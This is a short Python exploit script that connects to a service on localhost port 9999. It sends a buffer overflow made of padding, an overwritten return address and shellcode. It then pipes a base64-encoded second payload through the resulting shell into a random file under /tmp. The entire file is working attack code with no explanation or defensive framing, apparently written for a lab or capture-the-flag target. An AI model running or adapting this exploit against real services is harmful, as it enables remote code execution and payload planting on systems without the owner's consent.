#!/usr/bin/env python3


import base64
import random
import socket
import string
import struct
import sys
import time


with open(sys.argv[1], 'rb') as f:
    shellcode = f.read()

with open(sys.argv[4], 'rb') as f:
    payload = f.read()
fname = '/tmp/' + ''.join([random.choice(string.ascii_letters + string.digits) for i in range(10)])
cmdline = b'PATH=/bin:/usr/bin cat <<EOF | base64 -d > ' + fname.encode() + b'\n' + base64.b64encode(payload) + b'\nEOF\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
input('press any key to start exploit... ')
s.send(b'.' * (int(sys.argv[2]) + 8) + struct.pack('<Q', int(sys.argv[3], 16)) + shellcode + b'\n')

# wait a little so that the started shell gets the data
time.sleep(1)
s.send(cmdline)
s.close()
